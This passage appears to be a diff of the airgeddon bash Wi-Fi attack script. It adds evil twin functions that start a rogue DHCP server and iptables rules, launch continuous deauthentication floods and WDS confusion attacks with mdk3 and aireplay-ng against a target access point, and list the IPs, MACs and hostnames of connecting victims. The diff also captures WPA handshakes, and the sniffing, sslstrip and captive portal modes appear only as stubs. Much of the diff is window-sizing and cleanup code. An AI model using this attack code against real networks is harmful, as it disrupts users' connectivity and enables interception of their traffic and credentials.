+	iptables -A OUTPUT -p icmp --icmp-type 0 -s ${et_ip_router}/${ip_mask} -d ${et_ip_range}/${std_c_mask} -m state --state ESTABLISHED,RELATED -j ACCEPT
+	iptables -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
+	sleep 2
+}
+
+function launch_dhcp_server() {
+
+	killall dhcpd > /dev/null 2>&1
+
+	case ${et_mode} in
+		"et_onlyap")
+			dchcpd_scr_window_position=${g1_bottomleft_window}
+		;;
+		"et_sniffing"|"et_sniffing_sslstrip"|"et_captive_portal")
+			dchcpd_scr_window_position=${g3_middleleft_window}
+		;;
+	esac
+	apply_screen_correction ${dchcpd_scr_window_position}
+	xterm -hold -bg black -fg pink -geometry ${scrdata_corrected} -T "DHCP" -e "dhcpd -d -cf \"$dhcp_path\" $interface 2>&1 | tee -a $tmpdir/clts.txt" > /dev/null 2>&1 &
+	et_processes+=($!)
+	sleep 2
+}
+
+function exec_et_deauth() {
+
+	prepare_et_monitor
+
+	case ${et_dos_attack} in
+		"Mdk3")
+			killall mdk3 > /dev/null 2>&1
+			rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
+			echo ${bssid} > ${tmpdir}"bl.txt"
+			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} d -b $tmpdir\"bl.txt\" -c $channel"
+		;;
+		"Aireplay")
+			killall aireplay-ng > /dev/null 2>&1
+			deauth_et_cmd="aireplay-ng --deauth 0 -a $bssid --ignore-negative-one $iface_monitor_et_deauth"
+		;;
+		"Wds Confusion")
+			killall mdk3 > /dev/null 2>&1
+			deauth_et_cmd="mdk3 $iface_monitor_et_deauth w -e $essid -c $channel"
+		;;
+	esac
+
+	case ${et_mode} in
+		"et_onlyap")
+			deauth_scr_window_position=${g1_bottomright_window}
+		;;
+		"et_sniffing"|"et_sniffing_sslstrip"|"et_captive_portal")
+			deauth_scr_window_position=${g3_bottomleft_window}
+		;;
+	esac
+	apply_screen_correction ${deauth_scr_window_position}
+	xterm -hold -bg black -fg red -geometry ${scrdata_corrected} -T "Deauth" -e "$deauth_et_cmd" > /dev/null 2>&1 &
+	et_processes+=($!)
+	sleep 1
+}
+
+function set_control_script() {
+
+	rm -rf "$tmpdir$control_file" > /dev/null 2>&1
+
+	exec 3>"$tmpdir$control_file"
+
+	cat >&3 <<-'EOF'
+		#!/bin/bash
+		date_counter=`date +%s`
+		while true; do
+			echo
+	EOF
+
+	case ${et_mode} in
+		"et_onlyap")
+			local control_msg=${control_window_texts[$language,4]}
+		;;
+		"et_sniffing"|"et_sniffing_sslstrip")
+			local control_msg=${control_window_texts[$language,5]}
+		;;
+		"et_captive_portal")
+			local control_msg=${control_window_texts[$language,6]}
+		;;
+	esac
+
+	cat >&3 <<-EOF
+			echo -e "\t${yellow_color}${control_window_texts[$language,0]}\n"
+			echo -e "\t${blue_color}BSSID: ${normal_color}${bssid}"
+			echo -e "\t${blue_color}ESSID: ${normal_color}${essid}"
+			echo -e "\t${blue_color}${control_window_texts[$language,1]}: ${normal_color}${channel}"
+			echo
+			echo -e "\t${green_color}${control_window_texts[$language,2]}${normal_color}"
+	EOF
+
+	cat >&3 <<-'EOF'
+			hours=$(date -u --date @$((`date +%s` - ${date_counter})) +%H)
+			mins=$(date -u --date @$((`date +%s` - ${date_counter})) +%M)
+			secs=$(date -u --date @$((`date +%s` - ${date_counter})) +%S)
+			echo -e "\t$hours:$mins:$secs"
+	EOF
+
+	cat >&3 <<-EOF
+			echo
+			echo -e "\t${pink_color}${control_msg}${normal_color}\n"
+			echo -e "\t${green_color}${control_window_texts[$language,3]}${normal_color}"
+			readarray -t DHCPCLIENTS < <(cat "${tmpdir}clts.txt" | grep DHCPACK)
+			client_ips=()
+	EOF
+
+	cat >&3 <<-'EOF'
+			if [[ -z "${DHCPCLIENTS[@]}" ]]; then
+	EOF
+
+	cat >&3 <<-EOF
+				echo -e "\t${control_window_texts[$language,7]}"
+			else
+	EOF
+
+	cat >&3 <<-'EOF'
+				for client in "${DHCPCLIENTS[@]}"; do
+					[[ ${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="${BASH_REMATCH[1]}" && client_mac="${BASH_REMATCH[2]}"
+					if [[ " ${client_ips[*]} " != *" $client_ip "* ]]; then
+						client_hostname=""
+						[[ ${client} =~ .*(\(.+\)).* ]] && client_hostname="${BASH_REMATCH[1]}"
+						if [[ -z "$client_hostname" ]]; then
+							echo -e "\t$client_ip $client_mac"
+						else
+							echo -e "\t$client_ip $client_mac $client_hostname"
+						fi
+					fi
+					client_ips+=(${client_ip})
+				done
+			fi
+			echo -ne "\033[K\033[u"
+			sleep 0.3
+		done
+	EOF
+
+	exec 3>&-
+}
+
+function launch_control_window() {
+
+	case ${et_mode} in
+		"et_onlyap")
+			control_scr_window_position=${g1_topright_window}
+		;;
+		"et_sniffing"|"et_sniffing_sslstrip"|"et_captive_portal")
+			control_scr_window_position=${g3_topright_window}
+		;;
+	esac
+	apply_screen_correction ${control_scr_window_position}
+	xterm -hold -bg black -fg white -geometry ${scrdata_corrected} -T "Control" -e "bash \"$tmpdir$control_file\"" > /dev/null 2>&1 &
+	et_processes+=($!)
+}
+
+function kill_et_windows() {
+
+	for item in ${et_processes[@]}; do
+		kill ${item} &> /dev/null
+	done
+}
+
 function convert_cap_to_hashcat_format() {
 
 	tmpfiles_toclean=1
@@ -3586,7 +4625,8 @@ function attack_handshake_menu() {
 				capture_handshake_window
 				rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
 				echo ${bssid} > ${tmpdir}"bl.txt"
-				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} &
+				apply_screen_correction ${g1_bottomleft_window}
+				xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} > /dev/null 2>&1 &
 				sleeptimeattack=12
 			fi
 		;;
@@ -3598,7 +4638,8 @@ function attack_handshake_menu() {
 			else
 				capture_handshake_window
 				${airmon} start ${interface} ${channel} > /dev/null 2>&1
-				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} &
+				apply_screen_correction ${g1_bottomleft_window}
+				xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} > /dev/null 2>&1 &
 				sleeptimeattack=12
 			fi
 		;;
@@ -3609,7 +4650,8 @@ function attack_handshake_menu() {
 				attack_handshake_menu "new"
 			else
 				capture_handshake_window
-				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} &
+				apply_screen_correction ${g1_bottomleft_window}
+				xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} > /dev/null 2>&1 &
 				sleeptimeattack=16
 			fi
 		;;
@@ -3636,7 +4678,8 @@ function capture_handshake_window() {
 	language_strings ${language} 115 "read"
 
 	rm -rf ${tmpdir}"handshake"* > /dev/null 2>&1
-	xterm +j -sb -rightbar -geometry ${g1_topright_window} -T "Capturing Handshake" -e airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}"handshake" ${interface} &
+	apply_screen_correction ${g1_topright_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "Capturing Handshake" -e airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}"handshake" ${interface} > /dev/null 2>&1 &
 	processidcapture=$!
 }
 
@@ -3660,7 +4703,8 @@ function explore_for_targets_option() {
 	tmpfiles_toclean=1
 	rm -rf ${tmpdir}"nws"* > /dev/null 2>&1
 	rm -rf ${tmpdir}"clts.csv" > /dev/null 2>&1
-	xterm +j -sb -rightbar -geometry ${g1_topright_window} -T "Exploring for targets" -e airodump-ng -w ${tmpdir}"nws" ${interface}
+	apply_screen_correction ${g1_topright_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "Exploring for targets" -e airodump-ng -w ${tmpdir}"nws" ${interface} > /dev/null 2>&1
 	targetline=`cat ${tmpdir}"nws-01.csv" | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
 	targetline=`expr ${targetline} - 1`
 
@@ -3798,6 +4842,157 @@ function select_target() {
 	enc=${encs[$selected_target_network]}
 }
 
+function et_prerequisites() {
+
+	current_menu="evil_twin_attacks_menu"
+
+	case ${et_mode} in
+		"et_onlyap")
+			clear
+			language_strings ${language} 270 "title"
+			print_iface_selected
+			print_et_target_vars
+			print_iface_internet_selected
+			print_hint ${current_menu}
+			echo
+			language_strings ${language} 275 "blue"
+			echo
+			language_strings ${language} 276 "yellow"
+			print_simple_separator
+			ask_yesno 277
+			if [ ${yesno} = "n" ]; then
+				return_to_et_main_menu=1
+				return
+			fi
+			ask_bssid
+			ask_channel
+			ask_essid
+			return_to_et_main_menu=1
+			echo
+			language_strings ${language} 296 "yellow"
+			language_strings ${language} 115 "read"
+			prepare_et_interface
+			exec_et_onlyap_attack
+		;;
+		"et_sniffing")
+			clear
+			language_strings ${language} 291 "title"
+			print_iface_selected
+			print_et_target_vars
+			print_iface_internet_selected
+			print_hint ${current_menu}
+			#TODO: Evil Twin AP with sniffing
+		;;
+		"et_sniffing_sslstrip")
+			language_strings ${language} 292 "title"
+			print_iface_selected
+			print_et_target_vars
+			print_iface_internet_selected
+			print_hint ${current_menu}
+			#TODO: Evil Twin AP with sniffing and sslstrip
+		;;
+		"et_captive_portal")
+			language_strings ${language} 293 "title"
+			print_iface_selected
+			print_et_target_vars
+			print_hint ${current_menu}
+			#TODO: Evil Twin AP with captive portal
+		;;
+	esac
+}
+
+function et_dos_menu() {
+
+	if [ ${return_to_et_main_menu} -eq 1 ]; then
+		return
+	fi
+
+	clear
+	language_strings ${language} 265 "title"
+	current_menu="et_dos_menu"
+	initialize_menu_and_print_selections
+	echo
+	language_strings ${language} 47 "green"
+	print_simple_separator
+	language_strings ${language} 139 mdk3_attack_dependencies[@]
+	language_strings ${language} 140 aireplay_attack_dependencies[@]
+	language_strings ${language} 141 mdk3_attack_dependencies[@]
+	print_simple_separator
+	language_strings ${language} 266
+	print_hint ${current_menu}
+
+	read et_dos_option
+	case ${et_dos_option} in
+		1)
+			contains_element "$et_dos_option" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				et_dos_attack="Mdk3"
+				detect_internet_interface
+				if [ "$?" = "0" ]; then
+					et_prerequisites
+				else
+					return
+				fi
+			fi
+		;;
+		2)
+			contains_element "$et_dos_option" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				et_dos_attack="Aireplay"
+				detect_internet_interface
+				if [ "$?" = "0" ]; then
+					et_prerequisites
+				else
+					return
+				fi
+			fi
+		;;
+		3)
+			contains_element "$et_dos_option" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				et_dos_attack="Wds Confusion"
+				detect_internet_interface
+				if [ "$?" = "0" ]; then
+					et_prerequisites
+				else
+					return
+				fi
+			fi
+		;;
+		4)
+			return
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+
+	et_dos_menu
+}
+
+function detect_internet_interface() {
+
+	if [ -n "$internet_interface" ]; then
+		echo
+		language_strings ${language} 285 "blue"
+		ask_yesno 284
+		if [ ${yesno} = "n" ]; then
+			select_internet_interface
+		fi
+	else
+		select_internet_interface
+	fi
+
+	validate_et_internet_interface
+	return $?
+}
+
 function credits_option() {
 
 	clear
@@ -3858,6 +5053,16 @@ function invalid_iface_selected() {
 	select_interface
 }
 
+function invalid_internet_iface_selected() {
+
+	echo
+	language_strings ${language} 77 "yellow"
+	echo
+	language_strings ${language} 115 "read"
+	echo
+	select_internet_interface
+}
+
 function capture_traps() {
 
 	case ${current_menu} in
@@ -3900,20 +5105,31 @@ function exit_script_option() {
 			${airmon} stop ${interface} > /dev/null 2>&1
 			time_loop
 			echo -e ${green_color}" Ok\r"${normal_color}
-
-			if [ ${check_kill_needed} -eq 1 ]; then
-				language_strings ${language} 168 "multiline"
-				eval ${networkmanager_cmd}" > /dev/null 2>&1"
-				time_loop
-				echo -e ${green_color}" Ok\r"${normal_color}
-			fi
 		fi
+	fi
+
+	if [ ${nm_processes_killed} -eq 1 ]; then
+		action_on_exit_taken=1
+		language_strings ${language} 168 "multiline"
+		eval ${networkmanager_cmd}" > /dev/null 2>&1"
+		time_loop
+		echo -e ${green_color}" Ok\r"${normal_color}
 	fi
 
 	if [ ${tmpfiles_toclean} -eq 1 ]; then
 		action_on_exit_taken=1
 		language_strings ${language} 164 "multiline"
 		clean_tmpfiles
+		time_loop
+		echo -e ${green_color}" Ok\r"${normal_color}
+	fi
+
+	if [ ${routing_toclean} -eq 1 ]; then
+		action_on_exit_taken=1
+		language_strings ${language} 297 "multiline"
+		clean_routing_rules
+		killall dhcpd > /dev/null 2>&1
+		killall hostapd > /dev/null 2>&1
 		time_loop
 		echo -e ${green_color}" Ok\r"${normal_color}
 	fi
@@ -4009,6 +5225,7 @@ function special_distro_features() {
 	case ${distro} in
 		"Wifislax")
 			networkmanager_cmd="service restart networkmanager"
+			screen_correction_needed=1
 		;;
 		"SUSE"|"CentOS"|"Gentoo"|"Fedora"|"Red Hat")
 			networkmanager_cmd="service NetworkManager restart"
@@ -4053,7 +5270,7 @@ function check_if_kill_needed() {
 	fi
 }
 
-function detect_distro_main() {
+function general_checkings() {
 
 	compatible=0
 	distro="Unknown Linux"
@@ -4128,8 +5345,12 @@ function check_compatibility() {
 		echo -ne "$i"
 		time_loop
 		if ! hash ${i} 2> /dev/null; then
-			echo -e ${red_color}" Error\r"${normal_color}
+			echo -ne ${red_color}" Error"${normal_color}
 			optional_toolsok=0
+			if [ ${i} = "${optional_tools_names[6]}" ]; then
+				echo -ne " (isc-dhcp-server / dhcp)"
+			fi
+			echo -e "\r"
 		else
 			echo -e ${green_color}" Ok\r"${normal_color}
 			optional_tools[$i]=1
@@ -4272,8 +5493,12 @@ function initialize_script_settings() {
 
 	exit_code=0
 	check_kill_needed=0
+	nm_processes_killed=0
 	airmon_fix
 	autochanged_language=0
+	tmpfiles_toclean=0
+	routing_toclean=0
+	screen_correction_needed=0
 }
 
 function detect_screen_resolution() {
@@ -4321,12 +5546,12 @@ function set_windows_sizes() {
 					#Until 768 | 2)
 					set_windows_sizes_1280x768
 				;;
-				769|7[7-9][0-9]|[8-9][0-9][0-9]|10[0-1][0-9]|102[0-4])
-					#From 769 until 1024 | 2)
+				769|7[7-9][0-9]|[8-9][0-9][0-9]|10[0-1][0-9]|102[0-3])
+					#From 769 until 1023 | 2)
 					set_windows_sizes_1280x768
 				;;
 				*)
-					#From 1025 and so on | 3)
+					#From 1024 and so on | 3)
 					set_windows_sizes_1280x1024
 				;;
 			esac
@@ -4338,12 +5563,12 @@ function set_windows_sizes() {
 					#Until 768 | 4)
 					set_windows_sizes_1366x768
 				;;
-				769|7[7-9][0-9]|[8-9][0-9][0-9]|10[0-1][0-9]|102[0-4])
-					#From 769 until 1024 | 4)
+				769|7[7-9][0-9]|[8-9][0-9][0-9]|10[0-1][0-9]|102[0-3])
+					#From 769 until 1023 | 4)
 					set_windows_sizes_1366x768
 				;;
 				*)
-					#From 1025 and so on | 5)
+					#From 1024 and so on | 5)
 					set_windows_sizes_1366x1024
 				;;
 			esac
@@ -4364,6 +5589,21 @@ function set_windows_sizes() {
 			set_windows_sizes_standard
 		;;
 	esac
+}
+
+function apply_screen_correction() {
+
+	[[ ${1} =~ ^([0-9]+)x([0-9]+)([\+\-])([0-9]+)([\+\-])([0-9]+)$ ]] && scr1="${BASH_REMATCH[1]}" && scr2="${BASH_REMATCH[2]}" && scr3="${BASH_REMATCH[3]}" && scr4="${BASH_REMATCH[4]}" && scr5="${BASH_REMATCH[5]}" && scr6="${BASH_REMATCH[6]}"
+
+	if [ ${screen_correction_needed} -eq 1 ]; then
+		scr1=$((${scr1} - 11))
+		scr2=$((${scr2} - 1))
+		if [ ${scr6} -ne 0 ]; then
+			scr6=$((${scr6} - 30))
+		fi
+	fi
+
+	scrdata_corrected="${scr1}x${scr2}${scr3}${scr4}${scr5}${scr6}"
 }
 
 function set_windows_sizes_standard() {
@@ -4550,7 +5790,7 @@ function welcome() {
 		print_known_distros
 		echo
 		language_strings ${language} 9 "blue"
-		detect_distro_main
+		general_checkings
 		language_strings ${language} 115 "read"
 
 		airmonzc_security_check
@@ -4578,12 +5818,12 @@ function airmonzc_security_check() {
 
 function compare_floats_greater_than() {
 
-	awk -v n1=$1 -v n2=$2 'BEGIN{ if (n1>n2) exit 0; exit 1}'
+	awk -v n1=$1 -v n2=$2 'BEGIN{if (n1>n2) exit 0; exit 1}'
 }
 
 function compare_floats_greater_or_equal() {
 
-	awk -v n1=$1 -v n2=$2 'BEGIN{ if (n1>=n2) exit 0; exit 1}'
+	awk -v n1=$1 -v n2=$2 'BEGIN{if (n1>=n2) exit 0; exit 1}'
 }
 
 function download_last_version() {
@@ -4609,19 +5849,58 @@ function download_last_version() {
 	fi
 }
 
+function validate_et_internet_interface() {
+
+	echo
+	language_strings ${language} 287 "blue"
+	check_internet_access ${host_to_check_internet}
+
+	if [ "$?" != "0" ]; then
+		echo
+		language_strings ${language} 288 "yellow"
+		language_strings ${language} 115 "read"
+		return 1
+	fi
+
+	check_default_route ${internet_interface}
+	if [ "$?" != "0" ]; then
+		echo
+		language_strings ${language} 290 "yellow"
+		language_strings ${language} 115 "read"
+		return 1
+	fi
+
+	echo
+	language_strings ${language} 289 "yellow"
+	language_strings ${language} 115 "read"
+	return 0
+}
+
+function check_internet_access() {
+
+	ping -c 1 ${host_to_check_internet} -W 1 > /dev/null 2>&1
+	return $?
+}
+
+function check_default_route() {
+
+	route | grep ${1} | grep "default" > /dev/null
+	return $?
+}
+
 function autoupdate_check() {
 
 	echo
 	language_strings ${language} 210 "blue"
 	echo
-	hasinternet_access=0
+	hasinternet_access_for_update=0
 
-	ping -c 1 ${host_to_check_internet} -W 1 > /dev/null 2>&1
+	check_internet_access ${host_to_check_internet}
 	if [ "$?" = "0" ]; then
-		hasinternet_access=1
+		hasinternet_access_for_update=1
 	fi
 
-	if [ ${hasinternet_access} -eq 1 ]; then
+	if [ ${hasinternet_access_for_update} -eq 1 ]; then
 
 		airgeddon_last_version=`timeout -s SIGTERM 15 curl -L ${urlscript_directlink} 2> /dev/null | grep "airgeddon_version=" | head -1 | cut -d "\"" -f 2`
 
@@ -4682,6 +5961,14 @@ function check_pending_of_translation() {
 	fi
 
 	return 0
+}
+
+function under_construction_message() {
+
+	local var_uc="${under_constructionvar^}"
+	echo
+	echo_yellow "$var_uc..."
+	language_strings ${language} 115 "read"
 }
 
 function last_echo() {
